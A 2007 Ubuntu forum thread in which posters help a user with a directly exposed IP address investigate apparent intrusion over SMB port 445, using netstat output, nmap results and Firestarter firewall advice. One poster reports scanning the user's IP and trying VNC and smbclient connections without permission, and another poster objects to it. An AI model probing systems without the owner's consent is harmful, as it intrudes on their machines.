tcp        0  61440 85.222.7.185:6881       62.77.241.202:2621      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       76.104.150.22:3245      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:43404      84.100.17.85:10154      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:445        85.222.36.189:1120      ESTABLISHED-                   
tcp        0   1427 85.222.7.185:6881       81.71.3.123:51728       ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:50955      189.4.73.30:16813       ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       82.95.253.88:18918      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       82.170.163.131:29570    ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       85.186.56.250:1653      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       190.138.54.62:59269     ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       58.96.77.54:1767        ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       91.120.88.210:2563      ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:45161      80.195.165.143:49576    ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       85.186.140.111:4026     ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:57777      82.224.168.155:10978    ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:47879      80.72.40.81:80          TIME_WAIT  -                   
tcp        0     68 85.222.7.185:52099      200.55.103.83:50708     ESTABLISHED6661/python         
tcp        0    153 85.222.7.185:6881       217.117.122.198:56178   ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:58239      86.85.83.165:6881       ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       96.229.183.12:4594      TIME_WAIT  -                   
tcp        0  31437 85.222.7.185:51540      77.224.112.168:30794    ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       207.216.208.7:61073     ESTABLISHED6661/python         
tcp        0      0 85.222.7.185:6881       81.21.210.87:60175      ESTABLISHED6661/python         
tcp        0   4134 85.222.7.185:41734      201.51.119.86:7715      ESTABLISHED6661/python         
tcp6       0      0 :::22                   :::*                    LISTEN     -                   
tcp6       0      0 ::ffff:85.222.7.1:40132 ::ffff:209.73.170:11999 ESTABLISHED10664/java_vm  
```

Obviously, all those ports from my screenshot earlier are open and listening.

I feel like I'm standing in front of city hall naked screaming "Look at me!"

As far as I know I have SAMBA shut right down. I guess I'm wrong.

How do I clean up this mess? Do I uninstall the software? What? I'm dying here, guys.

---

### Post by tech9 on 2007-12-27
> **dannyboy79 said:**
> try to change your hostname or netbios name. I am VERY SHOCKED that Firestarter isn't logging this activity if it's coming from the outside world. You do not have a Private IP address so the only thing blocking people is Firestarter (iptables). I myself have never trusted firestarter. I either use a bash script that sets up iptables properly or I would buy a  Hardware Firewall that has NAT and SPI. Have you checked out 

/var/log/auth.log?

What does netstat -pant return?

This should show you all the port numbers that are listening. Any that have 0.0.0.0:21 would be listening to outside requests. If it's 127.0.0.1:21 than it's only listening to the loopback and that's ok. My example is port 21, FTP port. Are you sure you don't have SAMBA listening to outside requests?

Have you done a search for samsun.exe on your machine yet?

sudo find / -name samsun.exe

Good luck and keep us informed. This is very misterious

oh yes... I forgot to mention running the netstat command
nice advice dannyboy :)

---

### Post by tech9 on 2007-12-27
> **detroit/zero said:**
> I feel like I'm standing in front of city hall naked screaming "Look at me!"

no worries... we will figure it out and get you fixed

---

### Post by detroit/zero on 2007-12-27
Oh yes, I did search for samsun.exe some time ago, and that software is nowhere on my system.

---

### Post by tech9 on 2007-12-27
> **detroit/zero said:**
> Oh yes, I did search for samsun.exe some time ago, and that software is nowhere on my system.


refresh:

How are you connected again
to a modem?
a router/wireless router?

if so, do you have physical access to the router?

---

### Post by detroit/zero on 2007-12-27
>  refresh:

How are you connected again
to a modem?
a router/wireless router?

if so, do you have physical access to the router?**A:** I thought it was a router when I first started the thread, but we've all since  agreed that it's just a modem. Lacking a camera at the moment, my artistic rendition of the device can be seen a page or two back.

**EDIT:** Page 4, last post.

---

### Post by OffAxis on 2007-12-27
can you shut down deluge and rerun the 
```
sudo netstat -pant
```
command?

---

### Post by detroit/zero on 2007-12-27
> can you shut down deluge and rerun the 

Will do.

---

### Post by tech9 on 2007-12-27
> **detroit/zero said:**
> **A:** I thought it was a router when I first started the thread, but we've all since  agreed that it's just a modem. Lacking a camera at the moment, my artistic rendition of the device can be seen a page or two back.

**EDIT:** Page 4, last post.

from your diagram, it appears that you are indeed using a modem. Just my humble advice, if you can... go to the local Electronics store and buy a router. I am not sure what the cost would be in Poland, but here in the US they are about $50 dollars. (you could even get a wireless - just make sure you harden/secure it)

Simply ensure that your firewall is setup inside the router's config when you attain one, NAT is good.

Also, if you cannot go this route... can you access you cable modems config... if you can; change the password to a strong password.

I can assure you this cracker will not be showing up.

---

### Post by Niniel on 2007-12-27
Once your problem's been solved I'd be interested in somebody knowledgeable's analysis about how this all was possible to happen in the first place.
I mean, people trying to connect to your box is one thing, but to actually see the writing...

Good luck.

---

### Post by detroit/zero on 2007-12-27
Here is the new output from netstat -pant with nothing running.

```
~$ netstat -pant 
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     -                   
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     -                   
tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     -                   
tcp        0      0 85.222.7.185:445        85.222.36.189:1120      ESTABLISHED-                   
tcp6       0      0 :::22                   :::*                    LISTEN     -                   
```

---

### Post by dannyboy79 on 2007-12-27
it appears that someone is actually connected to your computer right now using port 445.

His ip is 85.222.36.189

when I issue whois on that ip, it instructs to send abuse emails to this address:
[email]abuse@astercity.net[/email]

If you only have 1 computer, why do you have samba enabled? It appears that you have vnc listening, both samba ports 445 and 139. Then also the port for bittorrents. Also SSH. Are you using a passphrase for your ssh server? What about a password for your vnc server? You really need to setup iptables properly if you want to be protected or get a hardware firewall. Also, if you don't use a service, then make it listen locally or uninstall it.

You can install iftop, then issue
sudo iftop -i eth0

This will monitor all network traffic on your eth0 interface. Once your in iftop, if it's not showing the source port or destination port, hold shift and hit the S key as well as the D key. It'll add the ports in which your computer is using and the port the outside person is using.

I am guessing he's logging in via samba because if he was logging via vnc, he would see that you don't have a windows machine. Is your IP address 85.222.7.185. If it is, I just ran nmap on it and this is what it returns EVERY PORT OPEN!!!!!!!!!

You definitely don't have firestarter setup or you disabled it or something. I tried connecting to your vnc server using TightVNC and I can't, I tried 5900 and display 0 and neither worked. I then tried to issue a smbclient command to see if I could get in that way, but it states, "protocol negotiation failed" so I am not sure how he is getting in?

If you see an IP address in your logs that starts with 67.53....., then it's me. I am merely trying to help you. I am not trying to attack you!

---

### Post by OffAxis on 2007-12-27
any idea what that **ESTABLISHED **connection could be?
Do you have any other network programs running?

---

### Post by davesmith on 2007-12-27
i've followed this thread with interest, seeing as i rely on firestarter too...could you run the netstat - pant as root and post the output with everything shut down?

<sudo netstat -pant>, 

Also tech9's advice to get a router with a NAT hardware firewall (NAT = network address translation) is sound. It will stealth your ports and block all attempts to connect to your m/c unless the request emanates from a prog you have running

---

### Post by dannyboy79 on 2007-12-27
yeah, it MS-ds. 

445	MS-ds	TCP/UDP	N	Microsoft data service, Win2k and later

That's how he is connecting I am guessing.

---

### Post by tech9 on 2007-12-27
> **dannyboy79 said:**
> it appears that someone is actually connected to your computer right now using port 445.

His ip is 85.222.36.189

when I issue whois on that ip, it instructs to send abuse emails to this address:
[EMAIL="abuse@astercity.net"]abuse@astercity.net[/EMAIL]

If you only have 1 computer, why do you have samba enabled? It appears that you have vnc listening, both samba ports 445 and 139. Then also the port for bittorrents. Also SSH. Are you using a passphrase for your ssh server? What about a password for your vnc server? You really need to setup iptables properly if you want to be protected or get a hardware firewall. Also, if you don't use a service, then make it listen locally or uninstall it.

You can install iftop, then issue
sudo iftop -i eth0

This will monitor all network traffic on your eth0 interface. Once your in iftop, if it's not showing the source port or destination port, hold shift and hit the S key as well as the D key. It'll add the ports in which your computer is using and the port the outside person is using.

I am guessing he's logging in via samba because if he was logging via vnc, he would see that you don't have a windows machine. Is your IP address 85.222.7.185. If it is, I just ran nmap on it and this is what it returns EVERY PORT OPEN!!!!!!!!!

You definitely don't have firestarter setup or you disabled it or something. I tried connecting to your vnc server using TightVNC and I can't, I tried 5900 and display 0 and neither worked. I then tried to issue a smbclient command to see if I could get in that way, but it states, "protocol negotiation failed" so I am not sure how he is getting in?

If you see an IP address in your logs that starts with 67.53....., then it's me. I am merely trying to help you. I am not trying to attack you!


here's a good quick test... disable remote desktop, then run the netstat command again to see if the intruder is still connected...

---

### Post by tech9 on 2007-12-27
> **dannyboy79 said:**
> yeah, it MS-ds. 

445    MS-ds    TCP/UDP    N    Microsoft data service, Win2k and later

That's how he is connecting I am guessing.

I would agree...

---

### Post by ChaosParser on 2007-12-27
If it's a wireless modem/gateway hybrid thing then you should be able to access the config page at: 

192.168.100.1

---

### Post by detroit/zero on 2007-12-27
I figured it was that ms-ds thing at the heart of it, but I have no clue what that is or why I have it running.

I have no idea what that active connection was. I had everything shut off except the terminal window I was using to run the command.

Here is sudo netstat -pant with nothing running but the terminal window:
(I should metion, too, that I just uninstalled both VNCviewer and SSH as much as possible without also uninstalling Ubuntu Desktop)
```
~$ sudo netstat -pant
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name   
tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN     6255/X              
tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN     4550/portmap        
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN     12635/cupsd         
tcp        0      0 85.222.7.185:46933      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46932      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46935      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46934      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46929      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46928      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46931      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46930      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46941      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46940      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46943      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46942      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46937      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46936      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46939      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46938      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46917      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46916      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46919      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46918      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46925      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46924      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46927      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46921      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46920      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46923      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46961      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46960      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46949      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46948      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46951      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46950      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46945      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46944      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46947      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46946      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46957      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46956      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46959      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46958      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46953      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46952      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46955      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46954      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46852      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46854      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46908      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46837      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46835      64.111.215.127:80       TIME_WAIT  -                   
tcp        0      0 85.222.7.185:34888      217.146.179.200:80      TIME_WAIT  -                   
tcp        0      0 85.222.7.185:46670      216.252.120.29:995      TIME_WAIT  -                   
tcp        0      0 85.222.7.185:60800      88.221.175.19:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43279      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43277      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43274      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43275      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43272      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43273      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43270      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43271      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43268      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43269      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43266      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43267      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43264      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43265      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43295      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43293      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43290      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43288      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43289      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43286      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43287      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43284      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43285      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43282      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43283      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43280      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43302      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43300      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43301      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43299      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43296      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43312      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43231      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43229      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43247      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43246      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43245      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43239      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43238      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43237      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43235      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43234      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43232      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43260      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43259      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43258      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43257      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43256      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43255      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43254      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43253      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43252      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43251      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43250      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43249      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:43248      91.189.94.186:80        TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54764      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54762      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54763      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54761      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54758      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54759      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54756      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54757      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:54755      80.72.40.78:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:60074      80.72.40.81:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:60075      80.72.40.81:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:60066      80.72.40.81:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35855      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35853      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35852      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35851      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35850      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35849      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35848      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35847      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35846      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35845      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35844      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35843      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35842      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35841      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35840      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35859      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35857      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35694      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35832      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35833      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35834      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35835      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35836      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35837      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35838      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35839      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35824      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35825      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35826      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35827      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35828      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35829      209.17.65.7:80          TIME_WAIT  -                   
tcp        0      0 85.222.7.185:35831      209.17.65.7:80          TIME_WAIT  -                   
tcp6       0      0 :::22                   :::*                    LISTEN     5835/sshd 
```

---

### Post by detroit/zero on 2007-12-27
> If it's a wireless modem/gateway hybrid thing then you should be able to access the config page at: 

192.168.100.1

When I type that address into the URL bar it just loads and loads and never connects or shows anything.

---

### Post by davesmith on 2007-12-27
if you can enable firestarter you could try and set a policy to refuse connections to the ip  85.222.36.189....enter 85.222.0.0/16 and check that policy is applied imediatley

the /16 will block a wide range, should stop it

---

### Post by OffAxis on 2007-12-27
> 91.189.94.186:80
is the ubuntu forums...funny.

> 192.168.100.1
that's only pertinent if you were on a local dhcp server with that address, which you're not.

---

### Post by detroit/zero on 2007-12-27
> if you can enable firestarter you could try and set a policy to refuse connections to the ip 85.222.36.189....enter 85.222.0.0/16 and check that policy is applied imediatley

the /16 will block a wide range, should stop itInbound traffic in Firestarter is (if I'm reading this correctly) restrictive by default and you have to enable what you want to connect:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-Firestarterzero-laptop.png[/IMG]

I notice that since I uninstalled samba, VNCviewer, and SSH, some of my open ports have closed when I run the port scan on localhost:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-PortScan-NetworkTools-1.png[/IMG]

compared to before:
[IMG]http://i150.photobucket.com/albums/s104/backup23/Screenshot-PortScan-NetworkTools.png[/IMG]

That SUNRPC is what? Java something? Remote procedure call? Why is SSH still there at all and why is it tied into ubuntu-desktop so I can't uninstall it completely? What is ipp? And why do I have a VNC port open when I uninstalled VNCviewer and have both RD and remote logins disabled in System> Administration> Login Window and Preferences> Remote Desktop?

6881 I expect to see, as you can see it listed in the Firestarter shot above. That's the only thing I have listed as open, though.

I'm going to do a quick reboot just to make sure all of these changes are taking hold. Back in a flash.

---

### Post by davesmith on 2007-12-27
with firestarter you need to set policy to block outbound connections to block an ip... click the "inbound" panel to get "outbound" and set your policy in the "permissive by default, blacklist traffic" panel....enter the IP range and add the policy

your printout of the <sudo netstat -pant> command shows that you are using a browser and the connections are via port 80. the ip's look fairly non-suspect to me, probably advertising from yahoo etc...and of course the cannonical ip too

---

### Post by OffAxis on 2007-12-27
> What is ipp? 
internet printing protocol, if I remeber correctly.

I hit you with an nmap scan after your uninstalls of vnc, ssh, etc. and you were still wide open.

---

### Post by detroit/zero on 2007-12-27
>  I hit you with an nmap scan after your uninstalls of vnc, ssh, etc. and you were still wide open.Yeah, I just went to an online port scanner after rebooting and it says my fly is as open as it gets.

This is awful.

Netstat now shows me listening only on ports 111 and 631. Who to believe?

---

### Post by detroit/zero on 2007-12-27
I made that policy change in firestarter. I then went to nmap-online.com and it says I'm tight..

You guys want to hit me again and see what you think?

---

### Post by OffAxis on 2007-12-27
I'm on it

---

### Post by OffAxis on 2007-12-27
you're good not responding to pings...

and (with a no ping option)

```
PORT     STATE  SERVICE           VERSION
6881/tcp closed bittorent-tracker
```

---

### Post by Jimmey on 2007-12-27
> **dannyboy79 said:**
>  Is your IP address 85.222.7.185. If it is, I just ran nmap on it and this is what it returns EVERY PORT OPEN!!!!!!!!!

Don't do stuff like this.

Port scanning is quite a big deal. You should never make a scan like this on any computer without the owner's permission. In this case, dannyboy didn't know who the owner actually was, and so had no way of getting that person's permission, which can land you in quite a lot of trouble.

I think that you should figure out what software is listening on each of the open ports, and un-install whatever you're not using. 

SSH is the more worrying one - What does
> apt-cache policy openssh-server say?

Note that a scan on 127.0.0.1 will **probably yield different results** to a scan on your active network interface's LAN IP address, which is fine. Just try scanning your LAN IP instead.

---

### Post by detroit/zero on 2007-12-27
Also, to go back about 4 or 5 pages.. how do I get rid of that third device - wifi0? Like I said, it's just a pseudo-device set up to monitor traffic in airmon-ng. Even now I see traffic going into and out of it in firestarter. It doesn't need to be there.. is it as simple as a umount or something, or what?

---

### Post by detroit/zero on 2007-12-27
> SSH is the more worrying one - What does 			 				*apt-cache policy openssh-server *say?

```
~$ apt-cache policy openssh-server
openssh-server:
  Installed: 1:4.3p2-8ubuntu1
  Candidate: 1:4.3p2-8ubuntu1
  Version table:
 *** 1:4.3p2-8ubuntu1 0
        500 http://us.archive.ubuntu.com feisty/main Packages
        100 /var/lib/dpkg/status

```

---

### Post by OffAxis on 2007-12-27
is wifi0 listed in your 
**/etc/network/interfaces** file?
you can comment it out there.

---

### Post by OffAxis on 2007-12-27
> Just try scanning your LAN IP instead
if you look back (about 8 pages now) you'll notice that there is no LAN IP, and that was a big part of the problem; a direct internet connection on the 85.222.x.xxx address.

---

### Post by detroit/zero on 2007-12-27
> is wifi0 listed in your 
**/etc/network/interfaces** file?
you can comment it out there.
Nope, it's not there. It shows up in my network selector applet, which says wireless is disabled, yet firestarter shows it as an active connection sending and receiving traffic.

---

### Post by psusi on 2007-12-27
You originally indicated that you had the computer connected to a wireless router, which then presumably was connected to the cable modem.  Now you seem to be saying you only have a cable modem, so where did wireless ever enter the picture?  You specifically mentioned an antenna.

---

### Post by detroit/zero on 2007-12-27
To go back a few pages, too, someone suggested checking my  **/var/log/auth.log **file.

Holy moly! The Germans, the Pennsylvania Dutch, the Chinese, the Koreans.. everybody and their 3rd cousins have been trying to break into my computer for weeks.

I'm surprised I still have a functioning system.

Unreal.

---

### Post by detroit/zero on 2007-12-27
> You originally indicated that you had the computer connected to a wireless router, which then presumably was connected to the cable modem. Now you seem to be saying you only have a cable modem, so where did wireless ever enter the picture? You specifically mentioned an antenna.

I assumed it was a router because it looks strikingly similar to the 2Wire Router I had at my old house in the States. 

I suppose that was a source of confusion for a while there, and I apologize for the mistake.

I did draw a critically acclaimed rendition of it back at the bottom of page four, if you care to see.

Since the occupation of "Network Administrator" is nowhere in my near (or distant) future, perhaps I'll become an "arteest".:)

---

### Post by OffAxis on 2007-12-27
can you shut it down with a
 ```
sudo ifdown wifi0
```
(after typing the **sudo ifdown** you can hit the Tab key and it'll list your devices)

---

### Post by OffAxis on 2007-12-27
> I did draw a critically acclaimed rendition of it back at the bottom of page four
hell ya.
[http://ubuntuforums.org/showpost.php?p=4024129&postcount=40]("http://ubuntuforums.org/showpost.php?p=4024129&postcount=40")

---

### Post by detroit/zero on 2007-12-27
> (after typing the **sudo ifdown** you can hit the Tab key and it'll list your devices)This is strange. Here's what I get there:
```
~$ sudo ifdown 
ath0   eth0   eth1   eth2   lo     wlan0 
```ath0, ok. eth0, ok. lo, ok... what are the rest of them? When I try to use the command you give on them it responds by saying that they're not configured..

I hate to pester you guys now.. if there's a manual I need to go read or something just point me in the right direction.

(I'm already downloading "networking for dummies" as we speak..)

---

### Post by OffAxis on 2007-12-27
does the virtual wireless connection show up (appropriately) under 
```
iwconfig
```

---

### Post by OffAxis on 2007-12-27
> ath0   eth0   eth1   eth2   lo     wlan0

**ath0** is used for the atheros network chipset based device (I think- someone please correct me if I'm wrong)

**eth0, eth1, eth2** are generic network connection names

**lo** is loopback (127.0.0.1)

**wlan0** is the generic wireless

---

### Post by detroit/zero on 2007-12-27
> does the virtual wireless connection show up (appropriately) under iwconfig?Yes it does:
```
~$ iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

